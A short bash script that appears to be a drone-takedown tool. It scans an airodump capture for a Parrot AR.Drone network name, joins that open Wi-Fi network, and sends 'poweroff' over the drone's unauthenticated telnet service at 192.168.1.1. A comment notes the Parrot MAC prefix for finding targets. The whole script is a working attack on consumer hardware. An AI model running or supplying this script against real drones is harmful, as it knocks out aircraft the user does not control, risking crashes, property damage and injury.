#!/bin/bash

pkill xterm
pkill airodump

apName=$(grep -Eo "ardrone_[0-9A-F]{6}" dump-01.csv)
if [ -z "$apName" ]; then
	echo "Parrot not found"
fi

sudo ifconfig wlan0 up
nmcli dev wifi connect $apName
(echo open "192.168.1.1"; sleep 1; echo "poweroff";) | telnet


#12:0F:7E - Parrot MAC
